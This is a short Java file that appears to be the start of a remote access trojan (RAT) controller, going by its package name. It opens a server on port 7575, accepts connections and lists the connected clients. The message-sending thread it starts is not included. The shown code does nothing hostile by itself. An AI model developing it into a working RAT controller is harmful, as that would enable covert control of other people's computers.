package hackforumsRatClient;

import java.util.List;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

public class Main {
	//Sets the Port
	final static int PORT = 7575;
	
	//Creates a list of Connected Clients
	static List<Socket> connectedClients = new ArrayList<Socket>();
	
	public static void main(String[] args){
		//Creates a Thread to Send Messages to connectedClients
		new Thread(new messageThread()).start();
		
		try {
			//Creates the ServerSocket
			ServerSocket serverSocket = new ServerSocket(PORT);
			
			while(true){
				//Waits for a Connection and Accepts it...
				Socket clientSocket = serverSocket.accept();
				System.out.println("A Client has connected!");
				//Adds it to the List
				connectedClients.add(clientSocket);
			}
			
			
			
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
